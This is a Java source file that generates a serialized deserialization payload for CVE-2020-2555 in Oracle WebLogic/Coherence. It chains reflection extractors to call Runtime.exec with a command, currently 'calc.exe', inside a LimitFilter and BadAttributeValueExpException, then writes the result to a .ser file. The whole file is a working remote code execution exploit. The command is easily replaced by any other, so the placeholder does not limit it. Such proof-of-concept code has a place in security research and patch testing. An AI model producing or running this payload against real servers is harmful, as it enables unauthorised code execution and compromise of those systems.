package GadGet.Weblogic;

import Commons.*;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Field;

public class cve_2020_2555 {
        public static void cve_2020_2555(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
                String cmd = "calc.exe";
                ValueExtractor[] valueExtractors = new ValueExtractor[]{
                        new ReflectionExtractor("getMethod", new Object[]{
                                "getRuntime", new Class[0]
                        }),
                        new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                        new ReflectionExtractor("exec", new Object[]{new String[]{"cmd", "/c", cmd}})
                };
                ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
                // chainedExtractor.extract(Runtime.class);
                BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
                LimitFilter limitFilter = new LimitFilter();
                Field field1 = limitFilter.getClass().getDeclaredField("m_comparator");
                field1.setAccessible(true);
                field1.set(limitFilter, chainedExtractor);

                Field field2 = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
                field2.setAccessible(true);
                field2.set(limitFilter, Runtime.class);
                Field field3 = badAttributeValueExpException.getClass().getDeclaredField("val");
                field3.setAccessible(true);
                field3.set(badAttributeValueExpException, limitFilter);

                Serializer1.serializer("resourse/cve_2020_2555.ser",badAttributeValueExpException);
        }
}